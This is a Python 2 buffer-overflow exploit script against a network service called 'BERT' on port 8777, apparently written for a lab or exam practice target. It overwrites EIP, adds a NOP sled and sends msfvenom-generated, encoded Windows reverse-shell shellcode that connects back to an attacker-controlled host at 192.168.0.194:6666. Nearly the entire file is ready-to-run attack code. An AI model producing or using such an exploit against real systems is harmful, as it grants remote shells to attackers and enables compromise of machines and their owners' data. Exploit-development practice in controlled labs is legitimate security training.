#! /usr/bin/python2
import socket;
import sys;

ip = "192.168.0.138"
port = 8777 # Bert Port
prefix = 'BERT /.:/'

offset = "A" * 1753
eip = "\x3C\x15\x50\x43"

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.194 LPORT=6666 -e x86/shikata_ga_nai -b "\x00\x0a\x0d" -f python
sled = "\x90" * 16
buf =  b""
buf += b"\xba\xf3\xaa\xe7\xbe\xda\xd6\xd9\x74\x24\xf4\x5e"
buf += b"\x29\xc9\xb1\x52\x83\xee\xfc\x31\x56\x0e\x03\xa5"
buf += b"\xa4\x05\x4b\xb5\x51\x4b\xb4\x45\xa2\x2c\x3c\xa0"
buf += b"\x93\x6c\x5a\xa1\x84\x5c\x28\xe7\x28\x16\x7c\x13"
buf += b"\xba\x5a\xa9\x14\x0b\xd0\x8f\x1b\x8c\x49\xf3\x3a"
buf += b"\x0e\x90\x20\x9c\x2f\x5b\x35\xdd\x68\x86\xb4\x8f"
buf += b"\x21\xcc\x6b\x3f\x45\x98\xb7\xb4\x15\x0c\xb0\x29"
buf += b"\xed\x2f\x91\xfc\x65\x76\x31\xff\xaa\x02\x78\xe7"
buf += b"\xaf\x2f\x32\x9c\x04\xdb\xc5\x74\x55\x24\x69\xb9"
buf += b"\x59\xd7\x73\xfe\x5e\x08\x06\xf6\x9c\xb5\x11\xcd"
buf += b"\xdf\x61\x97\xd5\x78\xe1\x0f\x31\x78\x26\xc9\xb2"
buf += b"\x76\x83\x9d\x9c\x9a\x12\x71\x97\xa7\x9f\x74\x77"
buf += b"\x2e\xdb\x52\x53\x6a\xbf\xfb\xc2\xd6\x6e\x03\x14"
buf += b"\xb9\xcf\xa1\x5f\x54\x1b\xd8\x02\x31\xe8\xd1\xbc"
buf += b"\xc1\x66\x61\xcf\xf3\x29\xd9\x47\xb8\xa2\xc7\x90"
buf += b"\xbf\x98\xb0\x0e\x3e\x23\xc1\x07\x85\x77\x91\x3f"
buf += b"\x2c\xf8\x7a\xbf\xd1\x2d\x2c\xef\x7d\x9e\x8d\x5f"
buf += b"\x3e\x4e\x66\xb5\xb1\xb1\x96\xb6\x1b\xda\x3d\x4d"
buf += b"\xcc\x25\x69\x4d\xce\xce\x68\x4d\xd0\x6f\xe4\xab"
buf += b"\x86\x7f\xa0\x64\x3f\x19\xe9\xfe\xde\xe6\x27\x7b"
buf += b"\xe0\x6d\xc4\x7c\xaf\x85\xa1\x6e\x58\x66\xfc\xcc"
buf += b"\xcf\x79\x2a\x78\x93\xe8\xb1\x78\xda\x10\x6e\x2f"
buf += b"\x8b\xe7\x67\xa5\x21\x51\xde\xdb\xbb\x07\x19\x5f"
buf += b"\x60\xf4\xa4\x5e\xe5\x40\x83\x70\x33\x48\x8f\x24"
buf += b"\xeb\x1f\x59\x92\x4d\xf6\x2b\x4c\x04\xa5\xe5\x18"
buf += b"\xd1\x85\x35\x5e\xde\xc3\xc3\xbe\x6f\xba\x95\xc1"
buf += b"\x40\x2a\x12\xba\xbc\xca\xdd\x11\x05\xfa\x97\x3b"
buf += b"\x2c\x93\x71\xae\x6c\xfe\x81\x05\xb2\x07\x02\xaf"
buf += b"\x4b\xfc\x1a\xda\x4e\xb8\x9c\x37\x23\xd1\x48\x37"
buf += b"\x90\xd2\x58"

buffer = prefix + offset + eip + sled + buf
try:
	print("Fuzzing BERT with %s bytes " % len(buffer))
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	connect = s.connect((ip,port))
	s.send(buffer)
	s.close()
except:
	print("error")
